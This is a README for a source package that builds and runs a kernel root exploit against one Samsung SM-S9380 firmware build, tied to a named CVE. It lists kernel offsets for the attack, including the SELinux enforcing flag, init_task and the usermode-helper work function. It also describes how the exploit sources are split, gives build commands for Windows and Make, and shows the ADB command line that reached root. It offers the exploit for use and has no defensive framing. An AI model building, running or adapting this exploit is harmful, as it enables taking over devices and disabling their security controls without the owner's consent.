# S9380ZHU1AYA1 V6 source package

This is the minimal source package used to compile the V6 payload that
reached `done=1 root=1` on SM-S9380 ZHU firmware S9380ZHU1AYA1.

The package intentionally does not contain `.o` files. They are generated
under `build/v6/obj` or `objects-rebuilt` during compilation.

## Target configuration

The offset table is:

`target/pa3q-S9380ZHU1AYA1/target.h`

Target table SHA-256:

`F0DD37BDDFCF157CE2ACD9E3CEA7D6D5002C3EF15BA0F7094EF32375DBFE8D51`

Important values:

```text
KIMAGE_TEXT_BASE                    0xffffffc080000000
SLIDE_TRACEFS_WORKER_CALLER_OFF     0x000d7ca0
ASHMEM_MISC_FOPS_OFF                0x02329ee0
ASHMEM_MISC_FOPS_FIELD_OFF         0x02329ef0
ASHMEM_FOPS_OFF                     0x0133b148
CONFIGFS_READ_ITER_OFF              0x0046e5f8
CONFIGFS_BIN_WRITE_ITER_OFF         0x0046eb24
INIT_TASK_OFF                       0x0215cd00
ROOT_TASK_GROUP_OFF                 0x023bed00
SELINUX_ENFORCING_OFF               0x02420e98
CALL_USERMODEHELPER_EXEC_WORK_OFF   0x000cf408
SYSTEM_UNBOUND_WQ_OFF               0x02149e60
ROOT_UMH_PATH                       /data/local/tmp/cve-2026-43499-root
```

## Source split

`src/original` contains `main.c`, `util.c`, `fops.c`, `pipe.c`,
`preload_minimal.c`, and compatibility globals from the restored original
tree.

`src/device` contains the tracefs `slide.c` and UMH `root.c`. These two files
were compiled with the device include tree; the object hashes match the V6
objects saved in `objects`.

`helper/su_daemon.c` is the helper used both by `--run-payload` and by the
kernel UMH path. It must be installed at the fixed `ROOT_UMH_PATH`.

## Build on Windows

Open PowerShell in this directory and run:

```powershell
.\build-v6.ps1
```

The script defaults to the NDK r29 clang path used for the successful build.
Pass `-Clang` if the NDK is installed elsewhere.

The outputs are written to `artifact-rebuilt/`.

## Build with Make

On Linux, WSL, or macOS with an Android NDK clang:

```sh
make CLANG=/path/to/clang
```

The Makefile creates intermediate files under `build/v6/obj`; they are not
needed at runtime and can be removed with `make clean`.

The expected payload hash is:

`B4A4E0A69B081FEC4840D0E47CDE5C4FAD50D9F93B04908739A5EC64B085EFCA`

The known-good V6 payload hash is:

`B4A4E0A69B081FEC4840D0E47CDE5C4FAD50D9F93B04908739A5EC64B085EFCA`

The helper source is `helper/su_daemon.c`; it is compiled together with the
payload by `build-v6.ps1` or `make`.

## Runtime entry

The successful ADB entry used the helper loader, not direct `LD_PRELOAD`:

```text
PSELECT_ROUTE_ATTEMPTS=1
PSELECT_DELAY_USEC=10000
/data/local/tmp/cve-2026-43499-root --run-payload \
  /data/local/tmp/cve-2026-43499-root-original-zhu-v6.so \
  /data/local/tmp/cve-2026-43499-root \
  /data/local/tmp/zhu-v6.log
```

The success line from the known-good run was:

```text
pipe-physrw-summary ... done=1 root=1 ...
```
